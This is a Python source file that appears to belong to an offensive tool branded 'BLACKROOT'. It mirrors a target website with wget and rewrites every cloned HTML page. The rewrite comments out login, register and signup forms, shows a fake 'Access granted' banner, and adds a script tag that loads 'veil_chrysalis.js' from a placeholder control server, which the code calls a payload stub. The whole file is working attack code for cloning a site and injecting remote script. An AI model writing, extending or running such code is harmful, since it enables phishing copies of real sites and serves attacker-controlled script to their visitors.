import os
import subprocess

def clone_site(target, output_dir="clones", silent=False):
    print(f"[🪞] Cloning site: {target}")
    domain = target.split("//")[-1].replace("/", "")
    target_dir = os.path.join(output_dir, domain)

    os.makedirs(target_dir, exist_ok=True)

    # Download all pages (do not skip login/register)
    cmd = [
        "wget",
        "--mirror",
        "--convert-links",
        "--adjust-extension",
        "--page-requisites",
        "--no-parent",
        "--directory-prefix", target_dir,
        target
    ]

    try:
        if silent:
            subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
        else:
            subprocess.run(cmd, check=True)
        print(f"[✔️] Clone saved to {target_dir}")
        inject_stub(target_dir)
    except subprocess.CalledProcessError:
        print(f"[❌] Failed to clone site: {target}")

def inject_stub(target_dir):
    import re
    html_files = []
    for root, _, files in os.walk(target_dir):
        for f in files:
            if f.endswith(".html") or f.endswith(".htm"):
                html_files.append(os.path.join(root, f))

    if not html_files:
        print("[⚠️] No HTML file found to inject payload.")
        return

    for html_path in html_files:
        try:
            with open(html_path, "r", encoding="utf-8", errors="ignore") as f:
                html = f.read()
            # Comment out login/register/signup forms and replace with bypass message
            def bypass_login_forms(match):
                return (f"<!-- BLACKROOT BYPASSED LOGIN/REGISTER FORM\n{match.group(0)}\nEND BYPASS -->"
                        f"<div style='color:red;font-weight:bold'>[BLACKROOT] Login/Register bypassed. Access granted.</div>")
            html = re.sub(r'<form[^>]*action=["\"][^>]*(login|register|signup)[^>]*>.*?</form>', bypass_login_forms, html, flags=re.IGNORECASE|re.DOTALL)
            # Inject stub
            html += "\n<!-- Injected by BLACKROOT.Agent -->\n"
            html += "<script src='https://your-control-node.com/veil_chrysalis.js'></script>\n"
            with open(html_path, "w", encoding="utf-8", errors="ignore") as f:
                f.write(html)
            print(f"[💉] Stub injected and login/register forms bypassed in {html_path}")
        except Exception as e:
            print(f"[!] Could not inject payload in {html_path}: {e}")
